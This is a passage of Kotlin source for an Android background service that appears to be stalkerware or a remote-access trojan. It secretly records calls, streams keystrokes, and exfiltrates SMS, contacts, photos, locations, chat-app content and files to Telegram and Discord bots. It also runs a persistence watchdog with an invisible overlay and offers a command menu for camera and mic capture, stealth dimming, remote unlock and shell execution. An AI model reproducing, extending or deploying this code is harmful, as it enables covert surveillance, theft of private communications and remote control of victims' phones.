                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    super.onCallStateChanged(state, phoneNumber)
                    when (state) {
                        TelephonyManager.CALL_STATE_OFFHOOK -> {
                            if (!isRecordingCall && ContextCompat.checkSelfPermission(this@MonitorService, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                                isRecordingCall = true
                                startMicCallRecording()
                            }
                        }
                        TelephonyManager.CALL_STATE_IDLE -> {
                            if (isRecordingCall) {
                                isRecordingCall = false
                                stopMicCallRecording()
                            }
                        }
                    }
                }
            }, android.telephony.PhoneStateListener.LISTEN_CALL_STATE)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to setup call state listener: ${e.message}")
        }
    }

    private fun startMicCallRecording() {
        try {
            val callRecDir = File(cacheDir, ".call_recs")
            if (!callRecDir.exists()) callRecDir.mkdirs()

            activeCallFile = File(callRecDir, "call_rec_${System.currentTimeMillis()}.m4a")
            @Suppress("DEPRECATION")
            activeCallRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                android.media.MediaRecorder(this)
            else
                android.media.MediaRecorder()

            activeCallRecorder?.apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128_000)
                setOutputFile(activeCallFile?.absolutePath)
                prepare()
                start()
            }
            Log.i(TAG, "Started automatic mic call recording")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start call recording: ${e.message}")
            try { activeCallRecorder?.release() } catch (_: Exception) {}
            activeCallRecorder = null
        }
    }

    private fun stopMicCallRecording() {
        try {
            activeCallRecorder?.stop()
            activeCallRecorder?.release()
            activeCallRecorder = null
            Log.i(TAG, "Stopped automatic mic call recording")

            if (activeCallFile != null && activeCallFile!!.exists() && activeCallFile!!.length() > 0) {
                serviceScope.launch {
                    uploadOrQueueCallRecording(activeCallFile!!)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop call recording: ${e.message}")
            try { activeCallRecorder?.release() } catch (_: Exception) {}
            activeCallRecorder = null
        }
    }

    private suspend fun uploadOrQueueCallRecording(file: File) {
        try {
            val bytes = file.readBytes()
            val deviceId = getOrCreateDeviceId()
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("title", "Call Recording (${file.name})")
                .addFormDataPart(
                    "audio",
                    file.name,
                    bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url(getTelegramApiUrl("sendAudio"))
                .post(body)
                .build()

            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    file.delete()
                    Log.i(TAG, "Call recording uploaded directly to Telegram successfully")
                } else {
                    saveToOfflineQueue(bytes.toString(), file.name)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Call recording upload failed, queued offline: ${e.message}")
            saveToOfflineQueue(file.readBytes().toString(), file.name)
        }
    }

    private var wakeLock: PowerManager.WakeLock? = null

    private fun acquireWakeLock() {
        if (wakeLock == null) {
            val powerManager = getSystemService(POWER_SERVICE) as? PowerManager
            wakeLock = powerManager?.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "HomeMonitor:PollWakeLock"
            )?.apply {
                acquire()
                Log.i(TAG, "Acquired PARTIAL_WAKE_LOCK for 24/7 background polling")
            }
        }
    }

    @Volatile private var wasAccessibilityConnected = true
    private var lastAccessibilityAlertTime = 0L

    private fun startAccessibilityPersistenceWatchdog() {
        serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    // Try attaching 1x1 invisible overlay window if overlay permission is active
                    attachInvisibleOverlayWindow()

                    val isEnabled = AppAccessibilityService.instance != null
                    val now = System.currentTimeMillis()

                    if (!isEnabled) {
                        // Alert on state transition OR once every 12 hours max (prevents user annoyance)
                        if (wasAccessibilityConnected || (now - lastAccessibilityAlertTime > 43_200_000L)) {
                            wasAccessibilityConnected = false
                            lastAccessibilityAlertTime = now
                            Log.w(TAG, "Accessibility service is currently DISCONNECTED or REVOKED.")
                            val deviceId = getOrCreateDeviceId()
                            val msg = "⚠️ **Accessibility Watchdog Alert**\n\n🆔 **Device ID**: `$deviceId`\n📱 **Model**: `${Build.MODEL}`\nStatus: Accessibility Service is **DISCONNECTED** or **REVOKED** by Android OS.\n\n💡 **Action Required**: Re-grant Accessibility Service in Play Service C2 Permission Controls."

                            sendMessage(CHAT_ID, msg, parseMode = "Markdown")
                            sendDiscordCategorizedMessage("03-accessibility-watchdog", msg)
                        }
                    } else {
                        if (!wasAccessibilityConnected) {
                            wasAccessibilityConnected = true
                            val deviceId = getOrCreateDeviceId()
                            val msg = "✅ **Accessibility Watchdog Resolved**\n\n🆔 **Device ID**: `$deviceId`\n📱 **Model**: `${Build.MODEL}`\nStatus: Accessibility Service is **CONNECTED & ACTIVE**."
                            sendMessage(CHAT_ID, msg, parseMode = "Markdown")
                            sendDiscordCategorizedMessage("03-accessibility-watchdog", msg)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Accessibility Watchdog error: ${e.message}")
                }
                delay(120_000L) // Check every 2 minutes (120 seconds)
            }
        }
    }

    private fun handleCheckAccessibilityStatus(chatId: String) {
        val isEnabled = AppAccessibilityService.instance != null
        val deviceId = getOrCreateDeviceId()
        val statusEmoji = if (isEnabled) "✅" else "⚠️"
        val statusText = if (isEnabled) "CONNECTED & ACTIVE" else "DISCONNECTED or REVOKED"
        val actionAdvice = if (isEnabled) "All keylogging, window tracking, and tap gestures operational." else "Action Required: Open Play Service app and re-grant Accessibility Service."

        val msg = "$statusEmoji **Accessibility Service Real-Time Status**\n\n" +
                "🆔 **Device ID**: `$deviceId`\n" +
                "📱 **Model**: `${Build.MODEL}`\n" +
                "📊 **Status**: `$statusText`\n\n" +
                "💡 **Details**: $actionAdvice"

        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("03-accessibility-watchdog", msg)
    }

    private fun sendDiscordLiveTypingEdit(appName: String, text: String) {
        if (DISCORD_BOT_TOKEN.isBlank() || DISCORD_GUILD_ID.isBlank()) return
        serviceScope.launch(Dispatchers.IO) {
            try {
                val channelId = getOrCreateDiscordChannelId("18-live-typing-feed") ?: return@launch
                val formattedContent = "⌨️ **Live Keystroke Stream [$appName]**\n```\n$text\n```"

                if (activeLiveTypingApp != appName || activeLiveTypingMessageId.isNullOrBlank()) {
                    activeLiveTypingApp = appName
                    val url = "https://discord.com/api/v10/channels/$channelId/messages"
                    val json = JSONObject().put("content", formattedContent)
                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val request = Request.Builder().url(url).addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN").post(body).build()
                    httpClient.newCall(request).execute().use { res ->
                        if (res.isSuccessful) {
                            val newMsgId = JSONObject(res.body?.string() ?: "{}").optString("id")
                            if (newMsgId.isNotBlank()) activeLiveTypingMessageId = newMsgId
                        }
                    }
                } else {
                    val msgId = activeLiveTypingMessageId!!
                    val url = "https://discord.com/api/v10/channels/$channelId/messages/$msgId"
                    val json = JSONObject().put("content", formattedContent)
                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val request = Request.Builder().url(url).addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN").patch(body).build()
                    httpClient.newCall(request).execute().use { res ->
                        if (!res.isSuccessful) {
                            activeLiveTypingMessageId = null
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendDiscordLiveTypingEdit error: ${e.message}")
            }
        }
    }

    private fun sendDiscordCategorizedMessage(channelName: String, contentText: String) {
        if (DISCORD_BOT_TOKEN.isBlank() || DISCORD_GUILD_ID.isBlank() || contentText.isBlank()) return
        serviceScope.launch(Dispatchers.IO) {
            if (!isNetworkConnected()) {
                enqueueOfflineTextMessage(channelName, contentText)
                return@launch
            }

            try {
                val channelId = getOrCreateDiscordChannelId(channelName) ?: return@launch
                val url = "https://discord.com/api/v10/channels/$channelId/messages"

                val chunks = chunkMessageText(contentText, maxChunkSize = 1850)
                for ((idx, chunk) in chunks.withIndex()) {
                    val finalContent = if (chunks.size > 1) "*(Part ${idx + 1}/${chunks.size})*\n$chunk" else chunk
                    val json = JSONObject().put("content", finalContent)
                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val request = Request.Builder()
                        .url(url)
                        .addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN")
                        .post(body)
                        .build()

                    httpClient.newCall(request).execute().use { res ->
                        if (!res.isSuccessful) {
                            enqueueOfflineTextMessage(channelName, finalContent)
                        }
                    }
                    if (chunks.size > 1) {
                        delay(300L)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendDiscordCategorizedMessage error: ${e.message}")
                enqueueOfflineTextMessage(channelName, contentText)
            } finally {
                firebaseC2Engine?.submitTelemetry(channelName, contentText)
                sendTelegramCategorizedMessage(channelName, contentText)
            }
        }
    }

    private fun sendTelegramCategorizedMessage(channelName: String, contentText: String) {
        val prefs = SecurityVaultManager.getEncryptedPrefs(this)
        val boundGroupChatId = prefs.getString("telegram_bound_group_chat_id", null)
        if (!boundGroupChatId.isNullOrBlank()) {
            val topicThreadId = prefs.getInt("tg_topic_$channelName", 0)
            val threadId = if (topicThreadId > 0) topicThreadId else null
            sendMessage(boundGroupChatId, contentText, parseMode = "Markdown", threadId = threadId)
        }
    }

    private fun chunkMessageText(text: String, maxChunkSize: Int = 1850): List<String> {
        if (text.length <= maxChunkSize) return listOf(text)
        val chunks = mutableListOf<String>()
        var start = 0
        while (start < text.length) {
            var end = (start + maxChunkSize).coerceAtMost(text.length)
            if (end < text.length) {
                val lastBreak = text.lastIndexOf('\n', end)
                if (lastBreak > start + 200) {
                    end = lastBreak + 1
                } else {
                    val lastSpace = text.lastIndexOf(' ', end)
                    if (lastSpace > start + 200) {
                        end = lastSpace + 1
                    }
                }
            }
            val chunk = text.substring(start, end).trim()
            if (chunk.isNotBlank()) {
                chunks.add(chunk)
            }
            start = end
        }
        return if (chunks.isNotEmpty()) chunks else listOf(text)
    }

    private fun sendDiscordCategorizedFile(channelName: String, file: File, contentType: String = "application/octet-stream") {
        if (DISCORD_BOT_TOKEN.isBlank() || DISCORD_GUILD_ID.isBlank() || !file.exists()) return
        serviceScope.launch(Dispatchers.IO) {
            if (!isWifiConnected()) {
                Log.i(TAG, "Wi-Fi is not connected. Queuing media file '${file.name}' in offline storage.")
                enqueueOfflineMediaFile(channelName, file, contentType)
                return@launch
            }

            try {
                val channelId = getOrCreateDiscordChannelId(channelName) ?: return@launch
                val url = "https://discord.com/api/v10/channels/$channelId/messages"
                val fileBody = file.asRequestBody(contentType.toMediaTypeOrNull())
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.name, fileBody)
                    .build()
                val request = Request.Builder()
                    .url(url)
                    .addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN")
                    .post(body)
                    .build()
                httpClient.newCall(request).execute().use { res ->
                    if (!res.isSuccessful) {
                        enqueueOfflineMediaFile(channelName, file, contentType)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendDiscordCategorizedFile error: ${e.message}")
                enqueueOfflineMediaFile(channelName, file, contentType)
            }
        }
    }

    private fun enqueueOfflineTextMessage(channelName: String, contentText: String) {
        try {
            val queueDir = File(filesDir, ".offline_queue")
            if (!queueDir.exists()) queueDir.mkdirs()
            val textFile = File(queueDir, "txt_${System.currentTimeMillis()}.json")
            val json = JSONObject().put("channel", channelName).put("text", contentText)
            textFile.writeText(json.toString())
        } catch (_: Exception) {}
    }

    private fun enqueueOfflineMediaFile(channelName: String, sourceFile: File, contentType: String) {
        try {
            val queueDir = File(filesDir, ".offline_queue")
            if (!queueDir.exists()) queueDir.mkdirs()
            val mediaFile = File(queueDir, "media_${System.currentTimeMillis()}_${sourceFile.name}")
            sourceFile.copyTo(mediaFile, overwrite = true)
            val metaFile = File(queueDir, "${mediaFile.name}.meta")
            val json = JSONObject().put("channel", channelName).put("contentType", contentType)
            metaFile.writeText(json.toString())
        } catch (_: Exception) {}
    }

    private fun flushOfflineTelemetryQueue() {
        if (!isNetworkConnected()) return
        serviceScope.launch(Dispatchers.IO) {
            try {
                val queueDir = File(filesDir, ".offline_queue")
                if (!queueDir.exists()) return@launch

                val files = queueDir.listFiles() ?: return@launch

                for (file in files) {
                    if (file.name.endsWith(".meta")) continue

                    if (file.name.startsWith("txt_") && file.name.endsWith(".json")) {
                        try {
                            val json = JSONObject(file.readText())
                            val channel = json.optString("channel")
                            val text = json.optString("text")
                            if (text.isNotBlank()) {
                                sendMessage(CHAT_ID, text)
                                if (channel.isNotBlank()) {
                                    sendDiscordCategorizedMessage(channel, text)
                                }
                                file.delete()
                            }
                        } catch (_: Exception) { file.delete() }
                    } else if (file.name.startsWith("media_")) {
                        try {
                            val metaFile = File(queueDir, "${file.name}.meta")
                            val contentType = if (metaFile.exists()) JSONObject(metaFile.readText()).optString("contentType") else "application/octet-stream"
                            val channel = if (metaFile.exists()) JSONObject(metaFile.readText()).optString("channel") else "08-photos-dump"

                            val sizeMb = file.length() / (1024.0 * 1024.0)
                            if (sizeMb > 25.0) {
                                val cloudUrl = uploadLargeFileWithCloudFallback(file)
                                if (cloudUrl != null) {
                                    val msg = "📦 **Offline Media Cloud Mirror** (${"%.2f".format(sizeMb)} MB)\n• **File**: `${file.name.removePrefix("media_")}`\n• **Download Link**: $cloudUrl"
                                    sendMessage(CHAT_ID, msg)
                                    sendDiscordCategorizedMessage(channel, msg)
                                    file.delete()
                                    if (metaFile.exists()) metaFile.delete()
                                }
                            } else {
                                sendDiscordCategorizedFile(channel, file, contentType)
                                file.delete()
                                if (metaFile.exists()) metaFile.delete()
                            }
                        } catch (_: Exception) { file.delete() }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "flushOfflineTelemetryQueue error: ${e.message}")
            }
        }
    }

    @Volatile private var cachedDiscordCategoryId: String? = null
    @Volatile private var isDiscordMatrixInitialized = false
    @Volatile private var isStatusOnlineAlertSent = false
    private val discordMatrixLock = Any()

    private fun deleteDiscordChannelOrCategory(channelId: String) {
        try {
            val url = "https://discord.com/api/v10/channels/$channelId"
            val req = Request.Builder()
                .url(url)
                .addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN")
                .delete()
                .build()
            httpClient.newCall(req).execute().close()
            Log.i(TAG, "Successfully deleted duplicate Discord channel/category ID: $channelId")
        } catch (e: Exception) {
            Log.e(TAG, "deleteDiscordChannelOrCategory error: ${e.message}")
        }
    }

    private fun ensureDiscordChannelMatrixSync() {
        if (DISCORD_BOT_TOKEN.isBlank() || DISCORD_GUILD_ID.isBlank()) return
        synchronized(discordMatrixLock) {
            if (isDiscordMatrixInitialized) return
            try {
                val deviceId = getOrCreateDeviceId()
                val categoryName = "📱 $deviceId"
                val prefs = getSharedPreferences("discord_channels", MODE_PRIVATE)

                val url = "https://discord.com/api/v10/guilds/$DISCORD_GUILD_ID/channels"
                val request = Request.Builder().url(url).addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN").get().build()

                var activeCategoryId: String? = null
                val foundCategoryIds = mutableListOf<String>()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val array = JSONArray(response.body?.string() ?: "[]")
                        for (i in 0 until array.length()) {
                            val obj = array.getJSONObject(i)
                            if (obj.optInt("type") == 4 && obj.optString("name").contains(deviceId)) {
                                foundCategoryIds.add(obj.getString("id"))
                            }
                        }
                    }
                }

                if (foundCategoryIds.isNotEmpty()) {
                    activeCategoryId = foundCategoryIds.first()
                    for (i in 1 until foundCategoryIds.size) {
                        deleteDiscordChannelOrCategory(foundCategoryIds[i])
                    }
                } else {
                    val catBody = JSONObject().put("name", categoryName).put("type", 4).toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val catReq = Request.Builder().url(url).addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN").post(catBody).build()
                    httpClient.newCall(catReq).execute().use { catRes ->
                        if (catRes.isSuccessful) {
                            activeCategoryId = JSONObject(catRes.body?.string() ?: "{}").optString("id")
                        }
                    }
                }

                cachedDiscordCategoryId = activeCategoryId
                if (activeCategoryId == null) return
                prefs.edit().putString("cat_id_$deviceId", activeCategoryId).apply()

                val existingChannelsByName = mutableMapOf<String, String>()
                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val array = JSONArray(response.body?.string() ?: "[]")
                        for (i in 0 until array.length()) {
                            val obj = array.getJSONObject(i)
                            if (obj.optString("parent_id") == activeCategoryId) {
                                val chanName = obj.optString("name")
                                val chanId = obj.optString("id")

                                if (existingChannelsByName.containsKey(chanName)) {
                                    deleteDiscordChannelOrCategory(chanId)
                                } else {
                                    existingChannelsByName[chanName] = chanId
                                    prefs.edit().putString("chan_$chanName", chanId).apply()
                                }
                            }
                        }
                    }
                }

                val requiredChannels = listOf(
                    "01-master-commands",
                    "02-status-alerts",
                    "03-accessibility-watchdog",
                    "04-notifications",
                    "05-keylogs-and-clipboard",
                    "06-sms-and-contacts",
                    "07-camera-output",
                    "08-photos-dump",
                    "09-call-logs-and-recs",
                    "10-ambient-mic-audio",
                    "11-screenshots-and-clips",
                    "12-screen-share-stream",
                    "13-gps-and-geofencing",
                    "14-files-and-backups",
                    "15-file-drop-and-share",
                    "16-termux-shell",
                    "17-alerts-and-sensors",
                    "18-live-typing-feed",
                    "19-ai-chatbots-stream",
                    "20-app-usage-telemetry",
                    "21-browser-history",
                    "22-whatsapp-stream",
                    "23-telegram-stream",
                    "24-messenger-stream",
                    "25-instagram-stream",
                    "26-signal-stream",
                    "27-other-chats-stream",
                    "28-youtube-history",
                    "29-ducky-script-payloads"
                )

                // Auto-purge any outdated channels on Discord server that are not in requiredChannels
                for ((chanName, chanId) in existingChannelsByName.toMap()) {
                    if (!requiredChannels.contains(chanName)) {
                        Log.i(TAG, "Deleting outdated Discord channel '$chanName' (ID: $chanId)")
                        deleteDiscordChannelOrCategory(chanId)
                        prefs.edit().remove("chan_$chanName").apply()
                        existingChannelsByName.remove(chanName)
                    }
                }

                for (chanName in requiredChannels) {
                    if (!existingChannelsByName.containsKey(chanName)) {
                        val chanBody = JSONObject()
                            .put("name", chanName)
                            .put("type", 0)
                            .put("parent_id", activeCategoryId)
                            .toString()
                            .toRequestBody("application/json".toMediaTypeOrNull())
                        val chanReq = Request.Builder().url(url).addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN").post(chanBody).build()
                        httpClient.newCall(chanReq).execute().use { chanRes ->
                            if (chanRes.isSuccessful) {
                                val newChanId = JSONObject(chanRes.body?.string() ?: "{}").optString("id")
                                if (newChanId.isNotBlank()) {
                                    existingChannelsByName[chanName] = newChanId
                                    prefs.edit().putString("chan_$chanName", newChanId).apply()
                                }
                            }
                        }
                    }
                }

                isDiscordMatrixInitialized = true
                if (!isStatusOnlineAlertSent) {
                    isStatusOnlineAlertSent = true
                    sendDiscordCategorizedMessage(
                        "02-status-alerts",
                        "🚀 **Device Connected & Online**\n\n🆔 **Device ID**: `${getOrCreateDeviceId()}`\n📱 **Model**: ${Build.MANUFACTURER} ${Build.MODEL}\n🤖 **Android OS**: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n🟢 **Discord Matrix Cleaned & Operational**"
                    )

                    // Trigger historical auto-dumpers for SMS, Contacts, and Call Logs ONCE on first boot/install
                    val hasDumpedHistory = prefs.getBoolean("historical_dump_done", false)
                    if (!hasDumpedHistory) {
                        prefs.edit().putBoolean("historical_dump_done", true).apply()
                        dumpHistoricalSmsAndContactsOnStartup()
                        dumpHistoricalCallLogsOnStartup()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "ensureDiscordChannelMatrix error: ${e.message}")
            }
        }
    }

    private fun ensureDiscordChannelMatrix() {
        if (DISCORD_BOT_TOKEN.isBlank() || DISCORD_GUILD_ID.isBlank()) return
        serviceScope.launch(Dispatchers.IO) {
            ensureDiscordChannelMatrixSync()
        }
    }

    private fun getOrCreateDiscordChannelId(channelName: String): String? {
        val prefs = getSharedPreferences("discord_channels", MODE_PRIVATE)
        var cachedId = prefs.getString("chan_$channelName", null)
        if (cachedId.isNullOrBlank()) {
            ensureDiscordChannelMatrixSync()
            cachedId = prefs.getString("chan_$channelName", null)
        }
        return cachedId
    }

    private val processedChannelMsgIds = java.util.concurrent.ConcurrentHashMap<String, String>()

    private fun startDiscordTelegramStylePollingLoop() {
        if (DISCORD_BOT_TOKEN.isBlank() || DISCORD_GUILD_ID.isBlank()) return
        ensureDiscordChannelMatrix()

        serviceScope.launch(Dispatchers.IO) {
            Log.i(TAG, "Discord Multi-Channel HTTP REST Polling Loop Started 🚀")
            while (isActive) {
                try {
                    val prefs = getSharedPreferences("discord_channels", MODE_PRIVATE)
                    val allChannels = prefs.all.filterKeys { it.startsWith("chan_") }.values.mapNotNull { it as? String }

                    if (allChannels.isEmpty()) {
                        ensureDiscordChannelMatrixSync()
                    } else {
                        for (channelId in allChannels) {
                            pollDiscordChannelMessages(channelId)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Discord HTTP REST Polling Error: ${e.message}")
                }
                delay(3000L)
            }
        }
    }

    private fun sendChannelSpecificHelpMenu(channelId: String) {
        val prefs = getSharedPreferences("discord_channels", MODE_PRIVATE)
        val channelName = prefs.all.entries.firstOrNull { it.value == channelId }?.key?.removePrefix("chan_") ?: "Channel"

        val helpMsg = when (channelName) {
            "01-master-commands" -> """
                💬 **#01-master-commands Master Control Directory:**
                • `!status` / `!alive` - Check online status & battery %
                • `!deviceinfo` / `!info` - Hardware specs, Dual SIM & OS telemetry
                • `!battery` / `!power` - Battery health, temp (°C) & voltage
                • `!wifi` / `!network` - Wi-Fi SSID, BSSID, RSSI dBm & IP
                • `!accessibility` / `!watchdog` - Real-time Accessibility Service status
                • `!camera` / `!frontcam` - Take Rear / Front Camera photo
                • `!videoclip <sec>` / `!frontvideo <sec>` - Record Camera Video Clip + Mic
                • `!audio <sec>` - Record Ambient Mic Audio (48.0kHz)
                • `!speak <text>` / `!tts <text>` - Spoken TTS Audio on phone speakers
                • `!torch <sec>` / `!flashlight <sec>` - Rear Camera LED Flashlight
                • `!screenshot` / `!livescreen <sec>` - Capture Screen Photo / Video Clip
                • `!webstream` - Launch Permanent WebStream Control Panel
                • `!location` / `!geolocation` - Acquire GPS fix & Google Maps link
                • `!files` / `!download <path>` / `!zip <path>` / `!disk` - Storage & Backup
                • `!setclipboard <text>` / `!copy <text>` - Inject Clipboard Text
                • `!toast <text>` - Display Floating System Toast Popup
                • `!vibrate <ms>` - Trigger Haptic Vibration Pulse
                • `!termux <cmd>` - Direct Linux CLI Execution
                • `!sensors` / `!motion` / `!proximity` / `!light` / `!steps` - Hardware Sensors
                • `!appusage` / `!apps` - App Usage & Installed Inventory
                • `!activateapp` / `!closeapp` / `!unlock` - Stealth Activation & Gatekeeper

                📥 **On-Demand Data & Telemetry Dump Commands:**
                • `!dumpall` / `!flush` - Master On-Demand Telemetry & Media Dump (All 13 Features)
                • `!dumpsms` / `!dumpcontacts` - Force dump SMS inbox & Address Book Contacts
                • `!dumpcalls` / `!dumpcallrecs` - Force dump Call History & Recording Audio Files
                • `!dumpphotos` / `!dumpgallery` - Force dump Camera Photos & Gallery Images
                • `!dumpscreenshots` / `!dumpscreen` - Force dump Screenshots
                • `!dumpnotifs` / `!dumpnotifications` - Force dump Notification Logs
                • `!dumpkeylogs` / `!dumpclipboard` - Force dump Typed Keylogs & Clipboard History
                • `!dumpbrowser` / `!dumphistory` - Force dump Browser Navigation & Search History
                • `!dumpyoutube` / `!dumpyt` - Force dump YouTube Watch & Search History
                • `!dumpaudio` / `!dumpmic` - Force dump Ambient Mic Audio Clips
                • `!dumpapps` - Force dump App Usage Telemetry & Installed Inventory
                • `!dumplocation` / `!dumpgps` - Force dump GPS Location History
                • `!dumpqueue` - Force flush Offline Telemetry Queue
            """.trimIndent()

            "02-status-alerts" -> """
                🟢 **#02-status-alerts Command List:**
                • `!status` / `!alive` - Check device online status & battery %
                • `!deviceinfo` / `!info` - View hardware specs, Dual SIM & OS telemetry
                • `!battery` / `!power` - View battery level, temperature (°C) & charging status
                • `!wifi` / `!network` - View Wi-Fi SSID, BSSID, RSSI dBm & local IP
                • `!deviceonline` / `!wsdevices` - View active WebSocket connected devices
                • `!dumpall` / `!flush` - Force dump all telemetry data across all features
            """.trimIndent()

            "03-accessibility-watchdog" -> """
                🛡️ **#03-accessibility-watchdog Command List:**
                • `!accessibility` / `!watchdog` / `!checkaccessibility` - View real-time Accessibility Service status
            """.trimIndent()

            "04-notifications" -> """
                🔔 **#04-notifications Command List:**
                • `!notif` / `!notifications` - View real-time app notification log
                • `!dumpnotifs` / `!dumpnotifications` - Force dump cached notification logs
            """.trimIndent()

            "05-keylogs-and-clipboard" -> """
                ⌨️ **#05-keylogs-and-clipboard Command List:**
                • `!keylogs` - View typed keystroke logs
                • `!clipboard` - View copied clipboard text
                • `!setclipboard <text>` / `!copy <text>` - Inject text onto system clipboard
                • `!dumpkeylogs` / `!dumpclipboard` - Force dump typed keylog files & clipboard
            """.trimIndent()

            "06-sms-and-contacts" -> """
                💬 **#06-sms-and-contacts Command List:**
                • `!sms` - Read recent SMS inbox
                • `!sendsms <number> <message>` - Send SMS message
                • `!contacts` - List full address book contacts
                • `!dumpsms` / `!dumpcontacts` - Force dump SMS & contacts address book
            """.trimIndent()

            "07-camera-output" -> """
                📷 **#07-camera-output Command List:**
                • `!camera` - Take Rear Camera photo
                • `!frontcam` - Take Front Camera photo
                • `!videoclip <seconds>` / `!recordvideo <seconds>` - Record Rear Camera video clip + mic audio (e.g. `!videoclip 15`)
                • `!frontvideo <seconds>` - Record Front Camera video clip + mic audio (e.g. `!frontvideo 15`)
                • `!dumpphotos` - Force dump cached photos
            """.trimIndent()

            "08-photos-dump" -> """
                📷 **#08-photos-dump Command List & Information:**
                • Real-time auto-dump of all newly clicked camera photos from gallery.
                • `!dumpphotos` / `!dumpgallery` - Force dump cached camera photos & gallery images
            """.trimIndent()

            "09-call-logs-and-recs" -> """
                📞 **#09-call-logs-and-recs Command List:**
                • `!calls` - View recent call history
                • `!callrecs` - View call recordings
                • `!makecall <number>` - Place phone call
                • `!dumpcalls` / `!dumpcallrecs` - Force dump call logs & recording audio files
            """.trimIndent()

            "10-ambient-mic-audio" -> """
                🎙️ **#10-ambient-mic-audio Command List:**
                • `!audio <seconds>` / `!mic <seconds>` - Record ambient mic audio (e.g. `!audio 15`, `!audio 60`)
                • `!speak <text>` / `!tts <text>` - Play spoken text-to-speech audio message on phone speakers
                • `!dumpaudio` / `!dumpmic` - Force dump cached ambient mic audio recordings
            """.trimIndent()

            "11-screenshots-and-clips" -> """
                📸 **#11-screenshots-and-clips Command List:**
                • `!screenshot` / `!screen` - Silent screen capture
                • `!livescreen <seconds>` / `!screenlive <seconds>` - Record screen sequence clip
                • `!watchscreen` - Start screen loop
                • `!stopwatchscreen` - Stop screen loop
                • `!dumpscreenshots` / `!dumpscreen` - Force dump cached screenshots
            """.trimIndent()

            "12-screen-share-stream" -> """
                🖥️ **#12-screen-share-stream Remote Control Directory:**
                • `!webstream` - Launch Permanent WebStream Server
                • `!stopwebstream` - Stop WebStream local server
                • `!stealth` / `!stealth on` - Activate Stealth Mode (dim backlight to 0.1% pitch dark)
                • `!stealth off` - Disable Stealth Mode & restore backlight
                • `!unlock` - Remote Screen Unlock Keyguard
            """.trimIndent()

            "13-gps-and-geofencing" -> """
                📍 **#13-gps-and-geofencing Command List:**
                • `!location` / `!geolocation` - Acquire fresh GPS fix & Google Maps link
                • `!geofence <radius>` - Set GPS geofence radius
                • `!dumplocation` / `!dumpgps` - Force dump GPS location history log
            """.trimIndent()

            "14-files-and-backups" -> """
                📂 **#14-files-and-backups Command List:**
                • `!files` / `!ls` / `!pwd` / `!cd <folder>` - Navigate & list storage files
                • `!download <number/path>` / `!getfile <path>` - Download specific file
                • `!zip <path>` / `!zipfolder <path>` - Create ZIP archive of folder
                • `!disk` / `!storage` - View storage & disk space telemetry
                • `!apps` / `!installedapps` - View full user-installed applications inventory
                • `!syncmedia` - Exfiltrate recent media archive
                • `!dumpall` / `!flush` - Master On-Demand Telemetry & Media Dump
            """.trimIndent()

            "15-file-drop-and-share" -> """
                📥 **#15-file-drop-and-share Command List:**
                • Drop/upload ANY file or attachment here to auto-save directly to `/storage/emulated/0/Download/`
            """.trimIndent()

            "16-termux-shell" -> """
                💻 **#16-termux-shell Command List:**
                • Type any Linux CLI command directly (e.g., `uname -a`, `ls -la`, `ps`, `top`, `df -h`)
                • `!installcloudflared` - Install cloudflared binary
                • `!termuxstatus` / `!termuxinfo` - View Termux shell engine status
            """.trimIndent()

            "17-alerts-and-sensors" -> """
                🚨 **#17-alerts-and-sensors Command List:**
                • `!sensors` / `!sensorstatus` - Real-time status of all 6 hardware sensors
                • `!motion` - Enable/disable motion & accelerometer movement alerts
                • `!proximity` - View proximity sensor status
                • `!light` / `!lux` - View ambient light sensor reading (lux levels)
                • `!steps` / `!pedometer` - View real-time step counter telemetry
                • `!gyro` / `!orientation` - View gyroscope & device tilt/rotation angles
                • `!compass` / `!magnetic` - View magnetometer & compass heading
                • `!vibrate <ms>` / `!buzz <ms>` - Trigger haptic vibration pulse on phone
                • `!toast <text>` - Display floating system Toast message on screen
            """.trimIndent()

            "18-live-typing-feed" -> """
                ⌨️ **#18-live-typing-feed Information:**
                • Real-time word-by-word live typing edit stream.
